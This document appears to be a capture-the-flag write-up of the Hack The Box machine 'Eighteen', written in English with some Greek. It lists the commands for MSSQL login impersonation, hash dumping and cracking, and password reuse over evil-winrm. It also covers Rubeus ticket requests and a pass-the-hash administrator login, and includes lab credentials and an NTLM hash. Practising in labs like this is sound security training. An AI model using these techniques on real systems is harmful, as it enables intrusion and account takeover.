# Notes - Eighteen HTB

## Initial Access

### Nmap Findings

* Open ports:

  * 80 (IIS)
  * 1433 (MSSQL)
  * 5985 (WinRM)

 MSSQL exposed → πιθανό entry point

---

## MSSQL Enumeration

Login using valid credentials:

```bash
impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@<targetIP>
```

---

### Privilege Check

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

→ Not sysadmin (0)

---

### Database Enumeration

```sql
SELECT name FROM sys.databases;
```

Found:

* financial_planner

---

### Impersonation

```sql
EXECUTE AS LOGIN = 'appdev';
```

👉 Privilege escalation μέσα στο MSSQL

---

### Data Extraction

```sql
USE financial_planner;
SELECT * FROM users;
```

Found credentials:

* admin hash
* test hash

---

## Password Cracking

Hash format:

```
pbkdf2:sha256:600000$...
```

Cracked password:

```
iloveyou1
```

---

## Lateral Movement (WinRM)

Add host:

```bash
nano /etc/hosts
```

```
<targetIP> dc01.eighteen.htb
```

---

Login:

```bash
evil-winrm -i dc01.eighteen.htb -u adam.scott -p 'iloveyou1'
```

---

## User Flag

```powershell
cd Desktop
type user.txt
```

---

## Post Exploitation

Upload tool:

```powershell
upload Rubeus.exe
```

---

## Kerberos Interaction

```powershell
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /dc:<targetIP> /enctype:aes256 /ptt
```

 Obtained TGT

---

 Note:

* PTT may fail λόγω session issues
* Kerberos interaction confirmed working

---

## Privilege Escalation (Alternative Path)

Used NTLM hash:

```bash
evil-winrm -i <targetIP> -u administrator -H 0b133be956bfaddf9cea56701affddec
```

---

## Root Flag

```powershell
cd Desktop
type root.txt
```

---

## Key Takeaways

* MSSQL misconfiguration → initial foothold
* Credential reuse → lateral movement
* WinRM → remote shell
* NTLM hash → privilege escalation

---
